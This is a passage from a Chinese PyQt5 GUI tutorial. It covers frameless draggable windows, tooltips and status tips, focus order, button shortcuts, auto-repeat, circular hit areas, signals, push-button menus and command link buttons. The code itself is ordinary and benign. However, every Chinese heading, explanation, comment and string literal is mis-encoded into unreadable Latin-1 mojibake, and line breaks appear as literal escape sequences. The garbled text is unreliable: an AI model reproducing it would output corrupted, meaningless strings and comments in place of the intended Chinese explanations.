window.showMinimized()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n#### æ¡ˆä¾‹\n\nåˆ›å»ºä¸€ä¸ªçª—å£ï¼Œè¦æ±‚æ— è¾¹æ¡†ï¼Œæ— æ ‡é¢˜ï¼Œçª—å£ä¸é€æ˜åº¦0.9ï¼Œè‡ªå®šä¹‰æœ€å°åŒ–ï¼Œæœ€å¤§åŒ–ï¼Œå…³é—­æŒ‰é’®ï¼Œæ”¯æŒæ‹–æ‹½ç”¨æˆ·åŒºç§»åŠ¨ã€‚\n\n```python\nfrom PyQt5.Qt import *\nimport sys\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle(\"é¡¶å±‚çª—å£æ“ä½œæ¡ˆä¾‹\")\n        self.setWindowFlags(Qt.FramelessWindowHint)  # æ— è¾¹æ¡†æ— æ ‡é¢˜\n        self.setWindowOpacity(0.9)  # ä¸é€æ˜åº¦\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.btn_width = 40\n        self.btn_height = 25\n        self.top_margin = 0\n        self.add_close_max_min()\n\n    def add_close_max_min(self): # æ·»åŠ ä¸‰ä¸ªæŒ‰é’®\n        self.close_btn = QPushButton(self)\n        self.close_btn.setText(\"å…³é—­\")\n        self.close_btn.resize(self.btn_width,self.btn_height)\n\n        self.max_btn = QPushButton(self)\n        self.max_btn.setText(\"æœ€å¤§\")\n        self.max_btn.resize(self.btn_width, self.btn_height)\n\n        self.min_btn = QPushButton(self)\n        self.min_btn.setText(\"æœ€å°\")\n        self.min_btn.resize(self.btn_width, self.btn_height)\n\n    def resizeEvent(self, QResizeEvent): #ç›‘å¬çª—å£å¤§å°çš„å˜åŒ–ï¼Œè®¡ç®—æŒ‰é’®çš„ä½ç½®ã€‚\n        self.close_btn.move(self.width() - self.close_btn.width(), self.top_margin)\n        self.max_btn.move(self.width() - 2 * self.close_btn.width(), self.top_margin)\n        self.min_btn.move(self.width() - 3 * self.close_btn.width(), self.top_margin)\n\n    def mousePressEvent(self, event):\n        if event.button() == Qt.LeftButton: #æŒ‰å‹é¼ æ ‡å·¦é”®\n            self.move_flags = True  #ç§»åŠ¨æ ‡å¿—\n            self.mouse_x = event.globalX()\n            self.mouse_y = event.globalY()\n            self.window_x = self.x()\n            self.window_y = self.y()\n\n    def mouseMoveEvent(self, event):\n        if self.move_flags: #å½“æŒ‰å‹é¼ æ ‡å·¦é”®ï¼Œæ‰è¿›è¡Œä¸‹æ–¹ç§»åŠ¨\n            self.move_x = event.globalX() - self.mouse_x\n            self.move_y = event.globalY() - self.mouse_y\n            self.move(self.window_x + self.move_x, self.window_y + self.move_y)\n\n    def mouseReleaseEvent(self, event):\n        self.move_flags = False\n\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = Window()\n# window = Window(flags=Qt.FramelessWindowHint) #åˆå§‹åŒ–çª—å£è®¾ç½®Flags\n\n\ndef max_normal_change_slot(): #ï¼ˆæœ€å¤§åŒ–/æ­£å¸¸ï¼‰åˆ‡æ¢æ§½å‡½æ•°\n    if window.isMaximized():\n        window.showNormal()\n        window.max_btn.setText(\"æœ€å¤§\")\n    else:\n        window.showMaximized()\n        window.max_btn.setText(\"æ¢å¤\")\n\nwindow.close_btn.pressed.connect(lambda: window.close())\nwindow.min_btn.pressed.connect(lambda: window.showMinimized())\nwindow.max_btn.pressed.connect(max_normal_change_slot)\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n#### è¾…åŠ©å·¥å…·\n\nä¸‹è½½åœ°å€ï¼šhttps://jwt1399.lanzoui.com/i6NwYrz69qd\n\næ­¤å·¥å…·å¯¹çª—å£æ ‡å¿— API è¿›è¡Œäº†å…¨é¢ä½¿ç”¨ï¼Œé€‰æ‹©å¯¹åº”çª—å£æ ·å¼å’Œé¡¶å±‚çª—å£å¤–è§‚æ ‡å¿—ï¼Œå¯æŸ¥çœ‹å¯¹åº”çª—å£æ˜¾ç¤ºæ•ˆæœã€‚\n\n![è¾…åŠ©å·¥å…·](https://img.jwt1399.top//img/20210801201124.png)\n\nQtå®˜æ–¹ä¹Ÿæœ‰ç±»ä¼¼çš„å·¥å…·ï¼š\n\nhttps://doc.qt.io/qt-5/qtwidgets-widgets-windowflags-example.html\n\n### äº¤äº’çŠ¶æ€*\n\nã€‚ã€‚ã€‚\n\n### ä¿¡æ¯æç¤º\n\n#### API\n\nçŠ¶æ€æç¤º\n\n- setStatusTip(str)  é¼ æ ‡åœåœ¨æ§ä»¶ä¸Šæ—¶, å±•ç¤ºåœ¨çŠ¶æ€æ \n- statusTip()\t è·å–è®¾ç½®çš„çŠ¶æ€æç¤ºä¿¡æ¯\n\nå·¥å…·æç¤º\n\n- setToolTip(str)  é¼ æ ‡æ‚¬åœåœ¨æ§ä»¶ä¸Šä¸€ä¼šå, å±•ç¤ºåœ¨æ—è¾¹\n- toolTip()   è·å–è®¾ç½®çš„å·¥å…·æç¤ºä¿¡æ¯\n\n- \n  setToolTipDuration(msec)  è®¾ç½®å·¥å…·æç¤ºçš„æ—¶é•¿\n- toolTipDuration() \tè·å–å·¥å…·æç¤ºçš„æ—¶é•¿\n\nè¿™æ˜¯å•¥æç¤º\n\n- setWhatsThis(str)  \tåˆ‡æ¢åˆ°\"æŸ¥çœ‹è¿™æ˜¯å•¥\"æ¨¡å¼, å†ç‚¹å‡»è¯¥æ§ä»¶æ—¶æ˜¾ç¤º\n- whatsThis()  è·å–è®¾ç½®çš„è¿™æ˜¯å•¥æç¤ºä¿¡æ¯\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()  # QMainWindowé‡‡ç”¨æ‡’åŠ è½½çš„æ–¹å¼(å½“æ§ä»¶ç”¨çš„æ—¶å€™æ‰ä¼šåŠ è½½ä¸Šå»)\nwindow.statusBar()      # ä½¿ç”¨çŠ¶æ€æ ï¼ŒçŠ¶æ€æ æ˜¾ç¤º\nwindow.setWindowFlags(Qt.WindowContextHelpButtonHint)  #æ¢ä¸ªå¸¦é—®å·çš„çª—å£æ ·å¼\nlabel = QLabel(window)\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"ä¿¡æ¯æç¤º\")\nlabel.setText(\"æ ‡ç­¾\")\n\n#è®¾ç½®çŠ¶æ€æç¤º\nwindow.setStatusTip(\"è¿™æ˜¯ä¸€ä¸ªçª—å£\")\nprint(window.statusTip()) #è·å–æç¤ºä¿¡æ¯\n#è®¾ç½®å·¥å…·æç¤º\nlabel.setToolTip(\"è¿™æ˜¯ä¸€ä¸ªæ ‡ç­¾\")\nprint(label.toolTip())\n#è®¾ç½®å·¥å…·æç¤ºæ—¶é•¿\nlabel.setToolTipDuration(2000)  #è®¾ç½®æç¤ºæ—¶é•¿ä¸º2s\nprint(label.toolTipDuration())  #è·å–æç¤ºæ—¶é•¿\n#è®¾ç½®è¿™æ˜¯å•¥æç¤º\nlabel.setWhatsThis(\"è¿™æ˜¯å•¥ï¼Ÿè¿™æ˜¯æ ‡ç­¾\")  #ç‚¹å‡»å³ä¸Šè§’ï¼Ÿå·ï¼Œå†ç‚¹å‡»æ ‡ç­¾æ‰æ˜¾ç¤º\nprint(label.whatsThis()) #è·å–æç¤ºä¿¡æ¯\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### ç„¦ç‚¹æ§åˆ¶\n\n#### API\n\nå•ä¸ªæ§ä»¶è§’åº¦\n\n- setFocus()  æŒ‡å®šæ§ä»¶è·å–ç„¦ç‚¹\n- setFocusPolicy(Policy) è®¾ç½®ç„¦ç‚¹è·å–ç­–ç•¥\n  - Policy\n    - Qt.TabFocus\t    é€šè¿‡Tabé”®è·å¾—ç„¦ç‚¹\n    - Qt.ClickFocus     é€šè¿‡è¢«å•å‡»è·å¾—ç„¦ç‚¹\n    - Qt.StrongFocus  å¯é€šè¿‡ä¸Šé¢ä¸¤ç§æ–¹å¼è·å¾—ç„¦ç‚¹\n    - Qt.NoFocus ä¸èƒ½é€šè¿‡ä¸Šä¸¤ç§æ–¹å¼è·å¾—ç„¦ç‚¹(é»˜è®¤å€¼),setFocusä»å¯ä½¿å…¶è·å¾—ç„¦ç‚¹\n- clearFocus() å–æ¶ˆç„¦ç‚¹\n\nçˆ¶æ§ä»¶è§’åº¦\n\n- focusWidget()    è·å–å­æ§ä»¶ä¸­å½“å‰èšç„¦çš„æ§ä»¶\n- focusNextChild()  èšç„¦ä¸‹ä¸€ä¸ªå­æ§ä»¶\n- focusPreviousChild()   èšç„¦ä¸Šä¸€ä¸ªå­æ§ä»¶\n- focusNextPrevChild(bool)\n  - True: ä¸‹ä¸€ä¸ª\n  - False: ä¸Šä¸€ä¸ª\n- setTabOrder(pre_widget , next_widget)  é™æ€æ–¹æ³•ï¼Œè®¾ç½®å­æ§ä»¶è·å–ç„¦ç‚¹çš„å…ˆåé¡ºåº\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget):\n    def mousePressEvent(self, event):\n        # self.focusNextChild()  #åœ¨å­æ§ä»¶ä¸­åˆ‡æ¢ç„¦ç‚¹\n        # self.focusPreviousChild()  #ååº\n        self.focusNextPrevChild(False)  # True æ˜¯å‰é¢çš„Next False æ˜¯åé¢çš„Prev\n        # print(self.focusWidget())  # ç‚¹å‡»æ—¶è·å–å®ƒçš„å­æ§ä»¶ä¸­è·å–ç„¦ç‚¹çš„é‚£ä¸ª\n\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = Window()\nlineEdit1 = QLineEdit(window)\nlineEdit2 = QLineEdit(window)\nlineEdit3 = QLineEdit(window)\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"ç„¦ç‚¹æ§åˆ¶\")\n\nlineEdit1.move(100,50)\nlineEdit2.move(100,100)\nlineEdit3.move(100,150)\n\nlineEdit2.setFocus() #å…ˆè®©ç¬¬äºŒä¸ªè·å–ç„¦ç‚¹\nlineEdit3.setFocusPolicy(Qt.TabFocus)  #ç¬¬ä¸‰ä¸ªåªèƒ½Tabé”®æ¥è·å¾—ç„¦ç‚¹\n# lineEdit2.clearFocus() #å–æ¶ˆå‰é¢è·å¾—çš„ç„¦ç‚¹\n\nprint(window.focusWidget())  # è·å–å½“å‰çª—å£çš„è·å–ç„¦ç‚¹çš„å­æ§ä»¶\n\n# tab åˆ‡æ¢  2  1  3\nWindow.setTabOrder(lineEdit2,lineEdit1)\nWindow.setTabOrder(lineEdit1,lineEdit3)\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n## QAbstractButton\n\n> æ‰€æœ‰æŒ‰é’®æ§ä»¶çš„åŸºç±»\n\n### æç¤ºæ–‡æœ¬\n\n- setText(str)  è®¾ç½®æŒ‰é’®æç¤ºæ–‡æœ¬\n- text() è·å–æŒ‰é’®æç¤ºæ–‡æœ¬\n\n### å›¾æ ‡ç›¸å…³\n\n- setIcon(QIcon(\"resource/h1.png\"))  è®¾ç½®å›¾æ ‡\n- setIconSize(QSize(w, h))  è®¾ç½®å›¾æ ‡å¤§å°\n- icon()  è·å–å›¾æ ‡\n- iconSize()  è·å–å›¾æ ‡å¤§å°\n\n### è®¾ç½®å¿«æ·é”®\n\n- æ–¹å¼1: æœ‰æç¤ºæ–‡æœ¬çš„  \n  - å¦‚æœæç¤ºæ–‡æœ¬åŒ…å«ï¼†ç¬¦å·, åˆ™QAbstractButtonä¼šè‡ªåŠ¨åˆ›å»ºå¿«æ·é”®  btn.setText(\"æŒ‰é’®2&abc\") â€”> Alt+a\n\n- æ–¹å¼2: æ²¡æœ‰æç¤ºæ–‡æœ¬çš„  \n  - setShortcut(\"Alt+G\")\n\n### è‡ªåŠ¨é‡å¤\n\n- setAutoRepeat(bool)\t\t\t\t\tè®¾ç½®è‡ªåŠ¨é‡å¤\n- setAutoRepeatInterval(æ¯«ç§’)   è®¾ç½®è‡ªåŠ¨é‡å¤æ£€æµ‹é—´éš”\n- setAutoRepeatDelay(æ¯«ç§’)       è®¾ç½®åˆæ¬¡æ£€æµ‹å»¶è¿Ÿ\n- autoRepeat()    \t\t\t\t\t         è·å–æ˜¯å¦è‡ªåŠ¨é‡å¤\n- autoRepeatInterval()                è·å–è‡ªåŠ¨é‡å¤æ£€æµ‹é—´éš”\n- autoRepeatDelay()                   è·å–åˆæ¬¡æ£€æµ‹å»¶è¿Ÿ\n\n```python\n#æŸ¥çœ‹æ˜¯å¦è‡ªåŠ¨é‡å¤\nprint(btn.autoRepeat())\n\n#è®¾ç½®è‡ªåŠ¨é‡å¤\nbtn.setAutoRepeat(True)\nbtn.setAutoRepeatDelay(2000)  #åˆæ¬¡æ£€æµ‹å»¶è¿Ÿä¸º2s\nbtn.setAutoRepeatInterval(1000)  #é‡å¤æ£€æµ‹é—´éš”ä¸º1s\n \nprint(btn.autoRepeatDelay())   #é¦–æ¬¡å»¶è¿Ÿ\nprint(btn.autoRepeatInterval()) #ä»¥åçš„è§¦å‘é—´éš”\n```\n\n### çŠ¶æ€\n\n- isDown() \t\t\t\t\t\t\t\t      æ˜¯å¦æŒ‰ä¸‹æŒ‰é’®\n- setDown(bool)                      è®¾ç½®æŒ‰é’®, æ˜¯å¦è¢«æŒ‰ä¸‹\n- isChecked()                           æ˜¯å¦é€‰ä¸­äº†æŒ‰é’®\n- isCheckable()                        æŒ‰é’®æ˜¯å¦å¯ä»¥è¢«é€‰ä¸­\n- setCheckable(bool)              è®¾ç½®æŒ‰é’®, æ˜¯å¦å¯ä»¥è¢«é€‰ä¸­\n- setChecked(bool)                 è®¾ç½®æŒ‰é’®, æ˜¯å¦è¢«é€‰ä¸­\n- toggle()                                 åˆ‡æ¢é€‰ä¸­ä¸éé€‰ä¸­çŠ¶æ€\n- ç»§æ‰¿äºQWidgetä¸­çš„èƒ½ç”¨çŠ¶æ€\n  - isEnabled()\n  - setEnabled(bool)\n\n### æ’ä»–æ€§\n\n- autoExclusive()  æ˜¯å¦è‡ªåŠ¨æ’ä»–ã€‚ä¸€èˆ¬æŒ‰é’®éƒ½æ˜¯Falseï¼Œåªæœ‰å•é€‰æŒ‰é’®æ˜¯True\n\n- setAutoExclusive(bool)   è®¾ç½®è‡ªåŠ¨æ’ä»–\n\n### ç‚¹å‡»\n\n- click()  æ™®é€šç‚¹å‡»\n- animateClick(ms)  å¸¦åŠ¨ç”»æ•ˆæœçš„ç‚¹å‡»\n\n### è®¾ç½®æœ‰æ•ˆåŒºåŸŸ\n\n- é‡å†™hitButton(QPoint)  æœ‰æ•ˆè¿”å›Trueï¼Œæ— æ•ˆè¿”å›False\n\n  åº”ç”¨åœºæ™¯ï¼šæŒ‡å®šç”¨æˆ·ç‚¹å‡»æŸä¸ªåŒºåŸŸæœ‰æ•ˆï¼Œè€Œä¸æ˜¯å•ä¸€çš„çŸ©å½¢\n\næ¡ˆä¾‹ï¼š\n\nè®¾ç½®åªç‚¹å‡»æŒ‰é’®ä¸­å¿ƒçš„åœ†å½¢åŒºåŸŸæ‰ä¼šæœ‰æ•ˆ\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Btn(QPushButton):\n    def hitButton(self, point):\n        print(\"ç‚¹å‡»ç‚¹åæ ‡:\", point)  # ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ä¹‹åï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†ç”¨æˆ·ç‚¹å‡»çš„ç‚¹ä¼ å‡ºæ¥\n        #åœ†å¿ƒåæ ‡\n        cir_x = self.width()/2\n        cir_y = self.height()/2\n        #é¼ æ ‡ç‚¹å‡»ç‚¹åæ ‡\n        hit_x = point.x()\n        hit_y = point.y()\n        #ç‚¹å‡»ç‚¹åˆ°åœ†å¿ƒè·ç¦» > åŠå¾„\n        if pow(hit_x-cir_x,2)+pow(hit_y-cir_y,2) > pow(self.width()/2,2):\n            return False #ä»£è¡¨ç‚¹å‡»æ— æ•ˆï¼Œä¸ä¼šè§¦å‘ä¿¡å·\n        return True #Trueä»£è¡¨ç”¨æˆ·ç‚¹å‡»çš„ç”¨æ•ˆ ï¼Œä¼šè§¦å‘ä¿¡å·çš„å‘å°„\n    \n############################ç”»å†…åˆ‡åœ†###############################\n    def paintEvent(self, event):\n        super().paintEvent(event)\n        # ç”»å®¶å’Œçº¸\n        painter = QPainter(self) # å®ƒé‡Œé¢çš„å‚æ•°æ˜¯ QPaintDevice â€œçº¸â€\n\n        #ç»™ç”»å®¶æ”¯ç¬”\n        pen = QPen(QColor(100,10,155),4)  #ç¬”çš„é¢œè‰²å’Œå®½åº¦\n        painter.setPen(pen)\n\n        #ç”»å®¶å¼€å§‹ç”»\n        painter.drawEllipse(self.rect()) #è¿™å°±æ˜¯ä¸¤ä¸ªç‚¹ï¼Œå››ä¸ªå€¼\n############################ç”»å†…åˆ‡åœ†###############################\n\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"è®¾ç½®æœ‰æ•ˆåŒºåŸŸ\")\n\nbtn = Btn(\"æŒ‰é’®\",window)\nbtn.resize(200,200)\nbtn.pressed.connect(lambda :print(\"æŒ‰é’®è¢«ç‚¹å‡»\"))\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### ä¿¡å·\n\n- pressed()   é¼ æ ‡æŒ‰ä¸‹ä¿¡å·\n- released()  é¼ æ ‡é‡Šæ”¾ï¼ˆ1.æ§ä»¶å†…æ¾å¼€é¼ æ ‡ã€2.é¼ æ ‡ç§»å‡ºæ§ä»¶èŒƒå›´åï¼‰\n\n- clicked(checked = false)  æ§ä»¶å†…æŒ‰ä¸‹+æ§ä»¶å†…é‡Šæ”¾\n\n- toggled(bool checked)    åˆ‡æ¢ä¿¡å·ï¼ŒæŒ‰é’®é€‰ä¸­çŠ¶æ€å‘ç”Ÿæ”¹å˜(ä¸€èˆ¬åœ¨å•é€‰æ¡†æˆ–è€…å¤é€‰æ¡†ä¸­ä½¿ç”¨)\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"ä¿¡å·\")\n\nbtn = QPushButton(\"æŒ‰é’®\",window)\nbtn.move(200,200)\n\nbtn.pressed.connect(lambda :print(\"æŒ‰é’®è¢«é¼ æ ‡æŒ‰ä¸‹äº†\"))\nbtn.released.connect(lambda :print(\"æŒ‰é’®è¢«é¼ æ ‡é‡Šæ”¾äº†\"))\n\n#clicked å¾€å¤–ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯å½“å‰æŒ‰é’®æ˜¯å¦æ˜¯è¢«é€‰ä¸­çš„çŠ¶æ€ï¼š\nbtn.clicked.connect(lambda arg:print(\"æŒ‰é’®è¢«é¼ æ ‡ç‚¹å‡»äº†\",arg))\n\n#toggledä¹Ÿä¼šå¾€å¤–ä¼ é€’ä¸ªå‚æ•°ï¼Œç”¨æ¥åé¦ˆæŒ‰é’®æ˜¯å¦è¢«é€‰ä¸­ã€‚ï¼ˆå‰ææ˜¯æŒ‰é’®å¯ä»¥è¢«é€‰ä¸­ï¼Œå¦‚æœæŒ‰é’®æœ¬èº«ä¸èƒ½è¢«é€‰ä¸­ä¸ä¼šè§¦å‘å®ƒã€‚ï¼‰\nbtn.toggled.connect(lambda arg:print(\"æŒ‰é’®é€‰ä¸­çŠ¶æ€å‘ç”Ÿæ”¹å˜\",arg))\nbtn.setCheckable(True) #è®¾ç½®æŒ‰é’®å¯é€‰ä¸­ï¼Œä¸è®¾çš„è¯ toggled ä¸ä¼šè§¦å‘\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n## QPushButton\n\n> QAbstractButton çš„å­ç±»\n\n### åˆ›å»ºæŒ‰é’®æ§ä»¶\n\n#### API\n\n- QPushButton()  \t\t\t                       åˆ›å»ºä¸€ä¸ªæ— çˆ¶æ§ä»¶çš„æŒ‰é’®æ§ä»¶\n- QPushButton(parent)                       åˆ›å»ºæ§ä»¶çš„åŒæ—¶, è®¾ç½®çˆ¶æ§ä»¶\n- QPushButton(text, parent)               åˆ›å»ºæ§ä»¶çš„åŒæ—¶, è®¾ç½®æç¤ºæ–‡æœ¬å’Œçˆ¶æ§ä»¶\n- QPushButton(icon, text, parent)      åˆ›å»ºæ§ä»¶çš„åŒæ—¶, è®¾ç½®å›¾æ ‡, æç¤ºæ–‡æœ¬å’Œçˆ¶æ§ä»¶\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"æŒ‰é’®åˆ›å»º\")\n\nbtn1 = QPushButton()\nbtn2 = QPushButton(window)\nbtn3 = QPushButton(\"æŒ‰é’®\",window)\nbtn4 = QPushButton(QIcon(\"image/jj.ico\"),\"æŒ‰é’®\",window)\n\nbtn1.move(200,50)\nbtn2.move(200,100)\nbtn3.move(200,150)\nbtn4.move(200,200)\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### å¿«æ·é”®\n\n#### API\n\n- QPushButton(\"&f\", window)\n- setText(\"&F\")\n- setShortcut(\"Alt+F\")\n\nåº”ç”¨åœºæ™¯ï¼šæƒ³é€šè¿‡å¿«æ·é”®è§¦å‘æŒ‰é’®ç‚¹å‡»äº‹ä»¶çš„æ—¶å€™è®¾ç½®\n\n### èœå•\n\n#### API\n\n- setMenu(QMenu)è®¾ç½®èœå•\n- menu() è·å–èœå•\n- showMenu() å±•ç¤ºèœå•\n\nåº”ç”¨åœºæ™¯ï¼šå¯ä»¥è®¾ç½®ç‚¹å‡»æŒ‰é’®æ˜¯å¼¹å‡ºçš„èœå•ï¼Œ ä¾›ç”¨æˆ·é€‰æ‹©\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"èœå•\")\n\n############################èœå•çš„è®¾ç½®###############################\nbtn = QPushButton(\"èœå•\",window)\nmenu = QMenu()\n# èœå•ä¹‹è¡Œä¸ºåŠ¨ä½œ æ–°å»ºï¼Œæ‰“å¼€,é€€å‡º\nnew_action = QAction(menu)  # çˆ¶æ§ä»¶æ˜¯menu\nnew_action.setText(\"æ–°å»º\")\nnew_action.setIcon(QIcon(\"image/jj.ico\"))\nnew_action.triggered.connect(lambda: print(\"æ–°å»ºæ–‡ä»¶\"))\n\nopen_action = QAction(menu)  # çˆ¶æ§ä»¶æ˜¯menu\nopen_action.setText(\"æ‰“å¼€\")\nopen_action.setIcon(QIcon(\"image/jj.ico\"))\nopen_action.triggered.connect(lambda: print(\"æ‰“å¼€æ–‡ä»¶\"))\n\n\nmenu.addAction(new_action)\nmenu.addAction(open_action)\n# åˆ†å‰²çº¿\nmenu.addSeparator()\n\n# èœå•ä¹‹å­èœå•   æœ€è¿‘æ‰“å¼€\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"æœ€è¿‘æ‰“å¼€ \")  # æ³¨æ„ä¸æ˜¯setText\nsub_menu.setIcon(QIcon(\"image/jj.ico\"))\n\nfile_action = QAction(\"Python_Gui_ç¼–ç¨‹\")\nsub_menu.addAction(file_action)\nmenu.addMenu(sub_menu)\nbtn.setMenu(menu)\n############################èœå•çš„è®¾ç½®###############################\n\n\n###########################################################\n# btn.showMenu()  #æ­¤æ—¶ï¼Œå…ˆå±•ç¤ºçš„æ˜¯èœå•ï¼Œå®ƒå¯ä»¥ç‹¬è‡ªå±•ç¤ºçš„ï¼Œå› ä¸ºå®ƒç›´æ¥ç»§æ‰¿çš„QWidget\n###########################################################\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n\n###########################################################\nbtn.showMenu()  #æ­¤æ—¶ï¼Œå…ˆå±•ç¤ºçš„æ˜¯çª—å£ï¼Œç„¶åå†å±•ç¤ºèœå•\n###########################################################\n\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### è¾¹æ¡†æ˜¯å¦ä¿æŒæ‰å¹³\n\n- setFlat(bool) é»˜è®¤å€¼ä¸ºFalse\n- isFlat() è·å–å½“å‰æŒ‰é’®è¾¹æ¡†æ˜¯å¦æ‰å¹³\n\n### é»˜è®¤å¤„ç†*\n\n- setAutoDefault(bool) è®¾ç½®ä¸ºè‡ªåŠ¨é»˜è®¤æŒ‰é’®\n- autoDefault()\n- setDefault(bool)\n- isDefault()\n\nåº”ç”¨åœºæ™¯ï¼šä¸»è¦åœ¨å¯¹è¯æ¡†ä¸­ï¼Œå½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªå¯¹è¯æ¡†ä¹‹åï¼Œå¯ä»¥è®¾ç½®é»˜è®¤å¤„ç†çš„æŒ‰é’®ã€‚\n\n### ä¿¡å·*\n\nâ€‹\téƒ½æ˜¯ç»§æ‰¿ä¸‹æ¥çš„\n\n- QAbstractButton\n  - pressed()  é¼ æ ‡æŒ‰ä¸‹ä¿¡å·\n  - released() é¼ æ ‡é‡Šæ”¾\n  - clicked(checked = false)  æ§ä»¶å†…æŒ‰ä¸‹+æ§ä»¶å†…é‡Šæ”¾\n  - toggled(bool checked)  åˆ‡æ¢ä¿¡å·(ä¸€èˆ¬åœ¨å•é€‰æ¡†æˆ–è€…å¤é€‰æ¡†ä¸­ä½¿ç”¨)\n- QWidget\n  - windowTitleChanged(QString)  çª—å£æ ‡é¢˜æ”¹å˜ä¿¡å·\n  - windowIconChanged(QIcon)     çª—å£å›¾æ ‡æ”¹å˜ä¿¡å·\n  - customContextMenuRequested(QPoint)  è‡ªå®šä¹‰ä¸Šä¸‹æ–‡èœå•è¯·æ±‚ä¿¡å·*\n\n## QMenu*\n\n- QMenu() åˆ›å»ºèœå•\n\n- addMenu(QMenu)  æ·»åŠ å­èœå•\n- addSeparator()  æ·»åŠ åˆ†å‰²çº¿\n- addAction() æ·»åŠ è¡Œä¸ºåŠ¨ä½œ\n- triggered    QActionä¿¡å·\n\n## QCommandLinkButton\n\n> å‘½ä»¤é“¾æ¥æ˜¯Windows Vistaå¼•å…¥çš„æ–°æ§ä»¶ï¼Œå‘½ä»¤é“¾æ¥æŒ‰é’®ä¸åº”å•ç‹¬ä½¿ç”¨ï¼Œè€Œåº”ä½œä¸ºå‘å¯¼å’Œå¯¹è¯æ¡†ä¸­å•é€‰æŒ‰é’®çš„æ›¿ä»£é€‰é¡¹ \n>\n>  QPushButton çš„å­ç±»\n\nåˆ›å»º\n\n- QCommandLinkButton(parent)\n- QCommandLinkButton(text, parent)\n- QCommandLinkButton(text, description ,parent)\n\næè¿°\n\n- setDescription(str)  è®¾ç½®å‘½ä»¤é“¾æ¥æŒ‰é’®çš„æè¿°æ–‡æœ¬\n- description()\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QCommandLinkButton\")\n\nclbtn = QCommandLinkButton(\"æ ‡é¢˜\",\"æè¿°\",window)\nclbtn.resize(100,80)\n# clbtn.setText(\"Python\")\n# clbtn.setDescription(\"hello world\")\n# clbtn.setIcon(QIcon(\"icon.ico\"))\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n![image-20210809172240677](https://img.jwt1399.top//img/20210809172251.png)\n\n## QToolButton\n\n> é€šå¸¸æ˜¯åœ¨å·¥å…·æ å†…éƒ¨ä½¿ç”¨ï¼Œå·¥å…·æŒ‰é’®é€šå¸¸ä¸æ˜¾ç¤ºæ–‡æœ¬æ ‡ç­¾ï¼Œè€Œæ˜¯æ˜¾ç¤ºå›¾æ ‡\n>\n> QAbstractButton çš„å­ç±»\n\n### åˆ›å»º\n\n- QToolButton(parent: QWidget = None)\n\n### (ç»§æ‰¿)è®¾ç½®æ–‡æœ¬,å›¾æ 